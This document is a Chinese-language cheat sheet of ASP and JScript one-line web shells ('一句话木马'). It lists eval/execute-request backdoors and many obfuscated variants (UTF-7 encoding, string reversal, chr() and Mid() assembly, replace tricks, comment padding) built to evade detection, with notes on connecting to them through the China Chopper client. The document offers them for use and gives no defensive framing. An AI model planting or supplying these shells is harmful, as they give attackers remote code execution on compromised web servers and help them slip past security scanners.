

# ASP一句话木马


## 标准一句话

```
<%eval request("sb")%>

<%execute request("sb")%>

<%Eval(Request(chr(35)))%>   password:#

<%Eval(((Request(chr(35)))))%> 可以有多对括号

<%ExecuteGlobal request("sb")%>

<%eval request.form("#")%>

<%eval request.item("#")%>

<%eval request("chopper")%>

<%execute request("1")%>


// 单独运行500错误，但是菜刀能连。
<%a=request("1")%><%execute a%>  

// 单独运行不报错，菜刀能连
<%a=request("1")%><%eval a%>

// 单独运行500错误，但是菜刀能连。
<%a=request("1")%><%executeglobal a%>
```


## 利用utf-7编码

密码是#，解密只需要将+k-去掉即可，这里的k可以是任意字符，长度也是随意。

```
<%@codepage=65000%>
<%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-l r+k-e+k-q+k-u+k-e+k-s+k-t("#")%>
```

解密后

```
<%@codepage=65000%>
<%response.codepage=936:eval request("#")%>
```

密码是：c

``` 
<%@codepage=65000%>
<%e+x-v+x-a+x-l(+x-r+x-e+x-q+x-u+x-e+x-s+x-t+x-(+x-+ACI-c+ACI)+x-)+x-%>  
```



## 字符串逆序


StrReverse Replace加密，解密后为：Execute eval request("cmd")

```
<%

Function decode(Code)
	decode=Replace(StrReverse(Code),"/*/","""") 
End Function
Execute decode(")/*/dmc/*/(tseuqer lave")
%> A
```

ASP自带逆序函数

```
<%execute(strreverse(")""xx""(tseuqer lave"))%>
```

## 利用chr ，request

```
<%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("1"))%>
```


## 利用asp的&连接符

```
<% eval""&("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0"&"-"&"2"&"-"&"5"&")"&")") %>
```

## 拆分

```
<% 
xx=request("xx") 
eval xx 
%> 
```

```
<% 
xx=request("xx") 
Rain=xx 
eval Rain 
%>  
```

```
<% 
xx=request("xx") 
Rain=xx 
bb=Rain
if 1=0 then
    response.write("123")
else 
    eval bb 
end if
%> 
```

## 字符串替换(replace函数) 

```
<% 
xxx="e0x0e0c0ut0e(0req0ue0st(""x0x""))" 
xxx=replace(xxx,"0","") 
eval xxx 
%>
```


## chr()连接字符串

```
<%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))("sz"))%>
```

## Mid()连接字符串

基本思路：乱序一个字符串然后反复Mid取字符构成一句话。 

```
<% 
Function d(s)
    d=Mid(love,s,1)
End Function
love="(tqxuesrav l)"&""""
execute(d(6)&d(10)&d(9)&d(12)&d(11)&d(8)&d(6)&d(3)&d(5)&d(6)&d(7)&d(2)&d(1)&d(14)&d(4)&d(4)&d(14)&d(13)) 
%>
```

## 字符连接成字符串 

```
<%eval("e"&"v"&"a"&"l"&"("&"r"&"e"&"q"&"u"&"e"&"s"&"t"&"("&"0″&"-"&"2″&"-"&"5″&")"&")")%>   密码-7  
```

## Jscript

```
< %@ Page Language = Jscript %>
< %var/*-/*-*/P/*-/*-*/=/*-/*-*/"e"+"v"+/*-/*-*/
"a"+"l"+"("+"R"+"e"+/*-/*-*/"q"+"u"+"e"/*-/*-*/+"s"+"t"+
"[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]"+
","+"\""+"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"+"\""+")";eval
(/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%> 密码 -7
```

```
< %@ Page Language="Jscript"%>< %eval(Request.Item["shezhang"],"unsafe");%>
```
